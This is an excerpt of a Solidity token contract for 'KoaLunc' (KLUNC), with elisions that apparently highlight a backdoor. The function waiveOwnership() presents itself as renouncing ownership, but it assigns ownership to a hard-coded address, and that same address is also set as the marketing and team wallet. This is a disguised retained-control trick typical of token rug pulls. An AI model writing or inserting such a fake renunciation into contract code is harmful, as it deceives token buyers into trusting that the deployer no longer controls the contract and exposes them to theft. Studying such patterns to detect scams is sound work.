...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF8c5C9543f79174cF715B345C305d729548d39cb);
    }
...
contract KoaLunc is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "KoaLunc";
    string private _symbol = "KLUNC";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xF8c5C9543f79174cF715B345C305d729548d39cb);
    address payable private teamWalletAddress = payable(0xF8c5C9543f79174cF715B345C305d729548d39cb);
